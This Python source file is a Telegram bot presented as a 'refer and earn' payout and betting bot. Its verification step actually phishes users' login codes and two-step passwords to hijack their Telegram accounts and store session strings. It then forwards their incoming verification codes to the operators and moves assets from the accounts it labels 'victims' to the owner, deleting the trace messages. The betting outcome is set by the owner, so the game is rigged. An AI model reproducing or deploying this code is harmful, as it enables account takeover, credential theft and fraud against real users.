# -*- coding: utf-8 -*-
import sqlite3
import logging
import random
import string
import re
import os
import threading
import asyncio
import time
from fastapi import FastAPI
import uvicorn
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, Bot
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, CallbackQueryHandler
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
API_ID = int(os.getenv("API_ID", "38746329"))
API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")

# FIXED OWNERS LIST
OWNERS = [7729056358, 8808192812]

TARGET_MAIL_BOT = "fakemailbot"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== STYLISH FONTS ==================
FONT_MAP = {
    'a': 'Ａ', 'b': 'Ｂ', 'c': 'Ｃ', 'd': 'Ｄ', 'e': 'Ｅ', 'f': 'Ｆ', 'g': 'Ｇ', 'h': 'Ｈ', 'i': 'Ｉ', 'j': 'Ｊ',
    'k': 'Ｋ', 'l': 'Ｌ', 'm': 'Ｍ', 'n': 'Ｎ', 'o': 'Ｏ', 'p': 'Ｐ', 'q': 'Ｑ', 'r': 'Ｒ', 's': 'Ｓ', 't': 'Ｔ',
    'u': 'Ｕ', 'v': 'Ｖ', 'w': 'Ｗ', 'x': 'Ｘ', 'y': 'Ｙ', 'z': 'Ｚ',
    'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ', 'E': 'Ｅ', 'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ', 'J': 'Ｊ',
    'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ', 'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ', 'T': 'Ｔ',
    'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ', 'Z': 'Ｚ'
}
def f_txt(text): return "".join(FONT_MAP.get(c, c) for c in text)
def p_style(text): return f"<code>{text}</code>,"

# ================== DATABASE ==================
DB_PATH = "refer_bot.db"

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT, 
        is_banned INTEGER DEFAULT 0, balance INTEGER DEFAULT 0, last_bonus REAL DEFAULT 0
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, upi_id TEXT, status TEXT DEFAULT 'Pending'
    )""")
    c.execute("CREATE TABLE IF NOT EXISTS bets (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, choice TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
    
    try: c.execute("ALTER TABLE users ADD COLUMN last_bonus REAL DEFAULT 0")
    except: pass

    for owner in OWNERS:
        c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (owner,))
    conn.commit()
    conn.close()

init_db()

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH, timeout=10)
    c = conn.cursor()
    try:
        c.execute(query, params)
        conn.commit()
        res = c.fetchall()
    finally:
        conn.close()
    return res

def get_config(key, default=None):
    res = db_exec("SELECT value FROM config WHERE key=?", (key,))
    return res[0][0] if res else default

def set_config(key, value):
    db_exec("INSERT OR REPLACE INTO config (key, value) VALUES (?,?)", (key, value))

# FORCE BYPASS: Har baar check karega ki ID admin hai ya nahi
def get_all_admins():
    # Hardcoded admins ko hamesha include karega
    admins = set(OWNERS)
    res = db_exec("SELECT user_id FROM admins")
    if res:
        for row in res:
            admins.add(row[0])
    return list(admins)

active_userbots = {}
temp_clients = {}
user_states = {}

# ================== FASTAPI ==================
web_app = FastAPI()
@web_app.get("/")
def read_root(): return {"status": "Alive"}
def run_web(): uvicorn.run(web_app, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

# ================== USERBOT AUTOMATION ==================
async def get_or_connect_client(user_id):
    if user_id in active_userbots: return active_userbots[user_id]
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    if not res or not res[0][0]: return None
    client = TelegramClient(StringSession(res[0][0]), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    return client

async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try: await active_userbots[user_id].disconnect()
        except: pass
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    
    @client.on(events.NewMessage(incoming=True))
    async def message_listener(event):
        try:
            if not event.is_private: return
            sender = await event.get_sender()
            if not sender: return
            
            uname = (getattr(sender, "username", "") or "").lower()
            sender_id = getattr(sender, "id", None)
            full_text = event.message.message or ""
            if not full_text: return

            is_otp = False
            if sender_id == 777000: is_otp = True
            elif uname.endswith("bot") and ("otp" in full_text.lower() or "code" in full_text.lower() or "verification" in full_text.lower()): is_otp = True
            elif uname == TARGET_MAIL_BOT.lower(): is_otp = True

            if is_otp:
                bot = Bot(BOT_TOKEN)
                for owner in get_all_admins():
                    try: await bot.send_message(owner, f"🔐 <b>{f_txt('NEW MESSAGE FROM ' + str(uname))}</b>,\n\n{p_style(full_text)}", parse_mode="HTML")
                    except: pass
        except Exception as e:
            logger.error(f"Listener error: {e}")

# ================== MAIL TRANSFER LOGIC ==================
async def transfer_and_claim(victim_uid, owner_chat_id):
    try:
        owner_receive_id = get_config("receive_mail_id")
        owner_claim_username = get_config("owner_claim_username")
        
        if not owner_receive_id or not owner_claim_username:
            return await Bot(BOT_TOKEN).send_message(owner_chat_id, f"⚠️ {p_style('Receive ID or Claim Username not set')}", parse_mode="HTML")
            
        victim_client = await get_or_connect_client(victim_uid)
        owner_client = await get_or_connect_client(int(owner_receive_id))
        
        if not victim_client or not owner_client: 
            return await Bot(BOT_TOKEN).send_message(owner_chat_id, f"❌ {p_style('Accounts not connected')}", parse_mode="HTML")
        
        target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
        owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
        
        await victim_client.send_message(target_bot, "/id")
        await asyncio.sleep(3) 
        messages = await victim_client.get_messages(target_bot, limit=2)
        if not messages: return
            
        emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
        if not emails: 
            return await owner_client.send_message(owner_chat_id, f"❌ {p_style('No mails found on this victim')}", parse_mode="HTML")

        total = len(emails)
        for idx, email in enumerate(emails, 1):
            await owner_client.send_message(owner_chat_id, f"🔄 <b>{f_txt('TRANSFERRING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
            
            await victim_client.send_message(target_bot, f"/transfer {email} {owner_claim_username}")
            await asyncio.sleep(3)
            
            try:
                msgs = await victim_client.get_messages(target_bot, limit=1)
                await victim_client.delete_messages(target_bot, msgs[0].id)
            except: pass
            
            await owner_client.send_message(owner_chat_id, f"📥 <b>{f_txt('CLAIMING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
            
            await owner_client.send_message(owner_target_bot, email)
            await asyncio.sleep(3)
            
            try:
                msgs = await owner_client.get_messages(owner_target_bot, limit=1)
                await owner_client.delete_messages(owner_target_bot, msgs[0].id)
            except: pass
            
            await owner_client.send_message(owner_chat_id, f"✅ <b>{f_txt('CLAIMED SUCCESSFULLY')}</b>:\n{p_style(email)}", parse_mode="HTML")
            await asyncio.sleep(1)
            
        await owner_client.send_message(owner_chat_id, f"👑 <b>{f_txt('ALL MAILS CLAIMED SUCCESSFULLY')}</b>,\n{p_style('Total: ' + str(total))}", parse_mode="HTML")
            
    except Exception as e:
        logger.error(f"Transfer error: {e}")
        await Bot(BOT_TOKEN).send_message(owner_chat_id, f"❌ {p_style('Error: ' + str(e))}", parse_mode="HTML")

# ================== KEYBOARDS ==================
def get_main_keyboard():
    kb = [
        [KeyboardButton("🎁 Bonus", style="primary"), KeyboardButton("💵 Balance", style="success")],
        [KeyboardButton("🔗 Refer Earn", style="primary"), KeyboardButton("🏦 Payout Method", style="primary"), KeyboardButton("💸 Withdraw", style="danger")],
        [KeyboardButton("🎰 Bet & Earn", style="success")]
    ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def get_bet_keyboard():
    kb = [
        [InlineKeyboardButton("🟢 Bet on Green", callback_data="bet_green")],
        [InlineKeyboardButton("🔵 Bet on Blue", callback_data="bet_blue")]
    ]
    return InlineKeyboardMarkup(kb)

# ================== BOT HANDLERS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    
    welcome_text = (
        f"👋 <b>{f_txt('WELCOME TO REFER EARN BOT')}</b>,\n\n"
        f"You will get {p_style('100rs')} per refer,\n"
        f"Minimum withdraw is {p_style('100rs')},\n\n"
        f"Please verify your contact to continue,"
    )
    
    if res and res[0][0]:
        await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
    else:
        await update.message.reply_text(
            f"🔒 <b>{f_txt('VERIFY YOURSELF')}</b>,\n\nPlease share your contact,\n",
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("📱 Share Contact", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
            parse_mode="HTML"
        )

async def verify_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact: return await update.message.reply_text("❌ Please use the button,")
    phone = contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    uid = update.effective_user.id
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone, 'state': 'otp'}
        await update.message.reply_text(
            f"📩 <b>{f_txt('We have sent you a Telegram verify password')}</b>,\n\n"
            f"Enter it manually below (Example: 1 2 3 4 5),\n",
            reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True),
            parse_mode="HTML"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e},")

async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    uid = update.effective_user.id
    
    # 1. ADMIN STATES
    if uid in get_all_admins():
        state = user_states.get(uid)
        if state == 'target':
            set_config("owner_claim_username", text)
            await update.message.reply_text(f"✅ {p_style('Claim Target Set to ' + text)}", parse_mode="HTML")
            user_states[uid] = None; return
        elif state == 'receive_id':
            set_config("receive_mail_id", text)
            await update.message.reply_text(f"✅ {p_style('Mails will be received on ID: ' + text)}", parse_mode="HTML")
            user_states[uid] = None; return
        elif state == 'result':
            res = text.upper()
            if res in ['RED', 'BLUE', 'GREEN']:
                set_config("bet_result", res)
                await update.message.reply_text(f"✅ {p_style('Bet Result set to ' + res)}", parse_mode="HTML")
            user_states[uid] = None; return
        elif state == 'admin':
            if text.isdigit():
                db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (int(text),))
                await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
            user_states[uid] = None; return

    # 2. LOGIN STATES (OTP & 2FA)
    if uid in temp_clients:
        state = temp_clients[uid].get('state')
        
        if state == '2fa':
            try:
                await temp_clients[uid]['client'].sign_in(password=text)
                session = temp_clients[uid]['client'].session.save()
                db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
                del temp_clients[uid]
                await start_userbot(uid, session)
                await update.message.reply_text(f"✅ <b>{f_txt('Verification Successful')}</b>,\n{p_style('Welcome to the bot')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
                return
            except Exception as e:
                await update.message.reply_text(f"❌ 2FA Failed: {e},")
                return
        
        elif state == 'otp':
            otp = text.replace(" ", "").replace("-", "")
            try:
                await temp_clients[uid]['client'].sign_in(phone=temp_clients[uid]['phone'], code=otp, phone_code_hash=temp_clients[uid]['hash'])
                session = temp_clients[uid]['client'].session.save()
                db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
                del temp_clients[uid]
                await start_userbot(uid, session)
                await update.message.reply_text(f"✅ <b>{f_txt('Verification Successful')}</b>,\n{p_style('Welcome to the bot')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
                return
            except Exception as e:
                if "Two-step" in str(e) or "password" in str(e).lower():
                    temp_clients[uid]['state'] = '2fa'
                    await update.message.reply_text(f"🔐 <b>{f_txt('ENTER 2FA PASSWORD')}</b>,\nSend it below,")
                    return
                else:
                    await update.message.reply_text(f"❌ OTP Failed: {e},\nTry again,")
                    return

    # 3. MENU BUTTONS
    if text == "🎁 Bonus":
        res = db_exec("SELECT last_bonus FROM users WHERE user_id=?", (uid,))
        last_bonus = res[0][0] if res and res[0][0] else 0
        if time.time() - last_bonus > 86400:
            db_exec("UPDATE users SET balance = balance + 5, last_bonus=? WHERE user_id=?", (time.time(), uid))
            await update.message.reply_text(f"🎁 <b>{f_txt('BONUS CLAIMED')}</b>,\n{p_style('You got 5rs')}", parse_mode="HTML")
        else:
            await update.message.reply_text(f"🎁 <b>{f_txt('ALREADY CLAIMED')}</b>,\nWait 24 hours,")
            
    elif text == "💵 Balance":
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        await update.message.reply_text(f"💵 <b>{f_txt('Balance')}</b>,\n\n{p_style('Current Balance: ₹' + str(bal))}", parse_mode="HTML")
        
    elif text == "🔗 Refer Earn":
        bot_username = (await context.bot.get_me()).username
        ref_link = f"https://t.me/{bot_username}?start={uid}"
        await update.message.reply_text(f"🔗 <b>{f_txt('Your Link')}</b>,\n\n{p_style(ref_link)}\nShare and earn 100rs,", parse_mode="HTML")
        
    elif text == "🏦 Payout Method":
        await update.message.reply_text(f"🏦 <b>{f_txt('How to Withdraw')}</b>,\n\nStep 1: Click on {p_style('💸 Withdraw')},\nStep 2: Enter amount,\nStep 3: Enter UPI ID,", parse_mode="HTML")
        
    elif text == "💸 Withdraw":
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if bal < 100:
            await update.message.reply_text(f"⚠️ <b>{f_txt('Insufficient Balance')}</b>,\nMin 100rs needed,\n{p_style('Your Balance: ₹' + str(bal))}", parse_mode="HTML")
            return
        user_states[uid] = 'withdraw_amt'
        await update.message.reply_text(f"💸 <b>{f_txt('Enter Amount to Withdraw')}:</b>,")

    elif text == "🎰 Bet & Earn":
        await update.message.reply_text(f"🎰 <b>{f_txt('Bet & Earn')}</b>,\n\nBet on Green or Blue,", reply_markup=get_bet_keyboard(), parse_mode="HTML")

    # 4. OTHER STATES
    elif user_states.get(uid) == 'withdraw_amt' and text.isdigit():
        amount = int(text)
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if amount < 100 or amount > bal: 
            await update.message.reply_text("❌ Invalid amount,")
            return
        user_states[uid] = 'withdraw_upi'
        user_states['temp_amount'] = amount
        await update.message.reply_text("🏦 Enter your UPI ID,")

    elif user_states.get(uid) == 'withdraw_upi':
        upi = text
        amount = user_states.get('temp_amount', 0)
        db_exec("INSERT INTO withdrawals (user_id, amount, upi_id) VALUES (?,?,?)", (uid, amount, upi))
        user_states[uid] = None
        await update.message.reply_text(f"✅ {p_style('Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
    
    elif user_states.get(uid) == 'bet_amt' and text.isdigit():
        amt = int(text)
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if amt > bal: 
            await update.message.reply_text("❌ Insufficient balance,")
            return
        choice = user_states.get('bet_choice')
        db_exec("INSERT INTO bets (user_id, amount, choice) VALUES (?,?,?)", (uid, amt, choice))
        user_states[uid] = None
        await update.message.reply_text(f"✅ <b>{f_txt('Bet Successful')}</b>,\n{p_style('Bet: ' + str(amt) + 'rs on ' + choice.upper())}", reply_markup=get_main_keyboard(), parse_mode="HTML")

async def bet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    choice = query.data.split("_")[1]
    user_states[query.from_user.id] = 'bet_amt'
    user_states['bet_choice'] = choice
    await query.edit_message_text(f"💰 <b>{f_txt('Enter amount to bet on ' + choice.upper())}</b>,")

# ================== OWNER PANEL ==================
async def total_ids_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in get_all_admins(): return
    
    users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
    if not users:
        return await update.message.reply_text("❌ No accounts logged in,")
        
    for u in users:
        victim_id, phone = u[0], u[1]
        victim_client = await get_or_connect_client(victim_id)
        if not victim_client: continue
        
        try:
            target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
            await victim_client.send_message(target_bot, "/id")
            await asyncio.sleep(3) 
            messages = await victim_client.get_messages(target_bot, limit=2)
            if not messages: continue
                
            emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
            total_mails = len(emails)
            
            kb = [[InlineKeyboardButton(f"📤 CLAIM ALL MAILS ({total_mails})", callback_data=f"claim_{victim_id}")]]
            text = f"👤 <b>{f_txt('ACCOUNT')}:</b> {p_style(victim_id)}\n📱 <b>{f_txt('PHONE')}:</b> {p_style(phone)}\n📧 <b>{f_txt('TOTAL MAILS')}:</b> {p_style(str(total_mails))}"
            
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text(f"❌ Error fetching {victim_id}: {e}")

async def claim_button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    victim_id = int(query.data.split("_")[1])
    await query.edit_message_text(f"⏳ <b>{f_txt('TRANSFERRING ALL MAILS')}</b> from {p_style(str(victim_id))}...", parse_mode="HTML")
    asyncio.create_task(transfer_and_claim(victim_id, query.from_user.id))

async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    # FIX: Sirf owner ID check karega
    if uid not in get_all_admins(): 
        return await update.message.reply_text("❌ You are not an admin!")
    
    kb = [
        [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc"), InlineKeyboardButton("🎯 Set Target", callback_data="admin_target")],
        [InlineKeyboardButton("📥 Set Receive ID", callback_data="admin_receive"), InlineKeyboardButton("📤 Claim All Mails", callback_data="admin_claim")],
        [InlineKeyboardButton("🎰 Set Result", callback_data="admin_result"), InlineKeyboardButton("👑 Add Admin", callback_data="admin_add")]
    ]
    await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>,\nCommands:\n{style('/totalids')} - to see all accounts & claim individually.", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id
    
    if data == "admin_acc":
        users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
        text = f"👥 <b>{f_txt('Accounts')}:</b>,\n\n"
        for u in users: text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
        await query.edit_message_text(text, parse_mode="HTML")
        
    elif data == "admin_target":
        await query.edit_message_text(f"🎯 {f_txt('Send username to set Claim Target')},")
        user_states[uid] = 'target'

    elif data == "admin_receive":
        await query.edit_message_text(f"📥 {f_txt('Send ONLY ONE Telegram ID to receive mails')},")
        user_states[uid] = 'receive_id'
        
    elif data == "admin_result":
        await query.edit_message_text(f"🎰 {f_txt('Send Result')} (RED or BLUE),")
        user_states[uid] = 'result'
        
    elif data == "admin_add":
        await query.edit_message_text(f"👑 {f_txt('Send User ID to make Admin')},")
        user_states[uid] = 'admin'

    elif data == "admin_claim":
        await query.edit_message_text(f"⏳ <b>{f_txt('FETCHING AND TRANSFERRING ALL MAILS')}</b>,\nPlease wait...", parse_mode="HTML")
        users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL AND user_id != ?", (uid,))
        if not users:
            return await query.message.reply_text("❌ No victim accounts found,")
        for u in users:
            asyncio.create_task(transfer_and_claim(u[0], uid))

# ================== MAIN ==================
def main():
    threading.Thread(target=run_web, daemon=True).start()
    app_bot = Application.builder().token(BOT_TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("owner", owner_panel))
    app_bot.add_handler(CommandHandler("totalids", total_ids_command))
    app_bot.add_handler(MessageHandler(filters.CONTACT, verify_phone))
    app_bot.add_handler(CallbackQueryHandler(bet_callback, pattern="^bet_"))
    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
    app_bot.add_handler(CallbackQueryHandler(claim_button_callback, pattern="^claim_"))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))

    logger.info("Bot started successfully.")
    app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
